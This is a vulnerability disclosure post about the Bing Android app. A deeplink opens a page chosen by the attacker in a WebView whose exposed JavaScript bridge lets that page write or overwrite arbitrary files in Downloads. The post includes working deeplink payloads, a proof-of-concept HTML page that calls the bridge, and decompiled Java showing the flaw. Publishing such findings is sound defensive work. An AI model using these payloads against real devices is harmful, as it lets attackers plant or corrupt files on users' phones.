---
date: "2026-09-29T12:18:25+08:00"
draft: false
title: "Arbitrary File Write and File Overwrite via Exposed JSBridge in Bing Android"
summary: "The Bing Android application allows attacker-controlled URLs to be loaded via a deeplink into a WebView that exposes a JavaScript bridge to the loaded page."


showToc: false
TocOpen: false
hidemeta: false
comments: false
disableHLJS: true
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
markup: goldmark
goldmark:
  renderer:
    unsafe: true
---

## **Summary**
An attacker can exploit this issue to open malicious web content in the Bing Android application via deeplink and use the exposed JSBridge to write or overwrite files in the current directory.

## **Exploit**
An attacker remotely triggered the vulnerable flow through the app’s deeplink from a browser, SMS, or email. The deeplink loaded an attacker-controlled URL in the WebView, allowing the page to invoke the exposed JavaScript bridge.

```html
<a href="sapphire://browser?url=https://nmochea.github.io/poc.html">Xploitz</a>

OR

<a href="Intent://browser?url=https://nmochea.github.io/poc.html#Intent;scheme=sapphire;action=android.intent.action.VIEW;end">Xploitz</a>
```

The deeplink causes the application to open an attacker‑controlled URL in its in‑app WebView. Because the WebView exposes a JSBridge without proper origin restrictions, the attacker page can call the bridge directly and cause the application to write arbitrary files or overwrite existing files, without user interaction.

```html
In write.html:

<!DOCTYPE html>
<html>
<head>
  <title></title>
  <script type="text/javascript">
    window.onload = function() {
      var content = 'Arbitray write file poc!';
      var base64 = btoa(content);
      var url = 'https://attacker.com/poc.txt';   // Can be .txt, .pdf, .apk, .html, etc..
      var contentDisposition = 'attachment; filename="poc.txt"';
      var mimeType = 'text/plain';
      if (window.iabSDKJSBridge && window.iabSDKJSBridge.saveBase64ToImageFile) {
        window.iabSDKJSBridge.saveBase64ToImageFile(base64, url, contentDisposition, mimeType);
      }
    };
  </script>
</head>
<body>
</html>
```

## **Technical Details**

The vulnerability begins with the application's handling of deeplinks, which allows an attacker to launch the application and load an arbitrary URL in WebView. The WebView is initialized with JavaScript enabled and exposes powerful native interfaces (such as iabSDKJSBridge) to all loaded content, without origin checks or validation. The saveBase64ToImageFile method on this bridge allows arbitrary file writes to the Downloads directory, with attacker-controlled filename and content. If a file with the same name already exists, it is overwritten, leading to file corruption. This is not limited to .txt files; any extension or file type can be targeted.

**In `com.microsoft.sapphire.app.browser.BrowserActivity(onNewIntent)`:**

This method receives the incoming Intent (including deeplinks), extracts the TemplateConfig extra (which contains the target URL), and passes it through to the BrowserMainFragment and ultimately to the InAppBrowserWebView for loading. There is no validation or restriction on the URL, so any deeplink can cause the app to load attacker-controlled content in a WebView.

```java
@Override
public final void onNewIntent(Intent intent) {
    ...
    JSONObject jSONObject = this.x;
    if (jSONObject != null && (optString2 = jSONObject.optString("url")) != null) {
        ...
        // Passes URL to BrowserMainFragment and InAppBrowserWebView
    }
    ...
    BrowserMainFragment browserMainFragment = this.w;
    if (browserMainFragment != null) {
        JSONObject jSONObject3 = this.x;
        ...
        bo5 config = new bo5(jSONObject3);
        ...
        um2 um2Var = browserMainFragment.V0;
        if (um2Var != null) {
            ...
            bo5 bo5Var = um2Var.d;
            if (bo5Var != null && (url = bo5Var.v) != null) {
                WebViewDelegate webViewDelegate2 = um2Var.i;
                if (webViewDelegate2 != null) {
                    webViewDelegate2.loadUrl(url, um2Var.U(bo5Var));
                }
            }
        }
    }
}
```

**In `com.microsoft.sapphire.app.browser.webview.InAppBrowserWebView(j method)`:**

This method initializes the WebView, enables JavaScript, and registers the JavaScript interfaces without any origin restriction or validation. Any web content loaded in this WebView can access the exposed native methods.

```java
public void j(Context context) {
    ...
    getSettings().setJavaScriptEnabled(true);
    addJavascriptInterface(new dbc(context, this), "iabSDKJSBridge");
    addJavascriptInterface(new w7p(this), "saTextSelBridge");
    ...
}
```

**In `defpackage.dbc(saveBase64ToImageFile method)`:**

This method is exposed to JavaScript and allows writing arbitrary files to the Downloads directory. The filename is derived from attacker-controlled parameters (url, contentDisposition, mimeType) using URLUtil.guessFileName. The file is written using pt9.writeBytes, which overwrites any existing file with the same name, also there is no validation or restriction on file type or extension.

```java
@JavascriptInterface
public void saveBase64ToImageFile(String base64, String url, String contentDisposition, String mimetype) {
    File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
        URLUtil.guessFileName(url, contentDisposition, mimetype));
    byte[] decoded = Base64.decode(base64, Base64.DEFAULT);
    pt9.writeBytes(file, decoded);
    ...
}
```

**In `defpackage.pt9(writeBytes method)`:**

This utility method writes the provided bytes to the specified file. It opens the file in overwrite mode, so any existing file with the same name is replaced, leading to file corruption if the filename is reused.

```java
public static void writeBytes(File file, byte[] data) {
    FileOutputStream fos = new FileOutputStream(file);
    fos.write(data);
    fos.close();
}
```


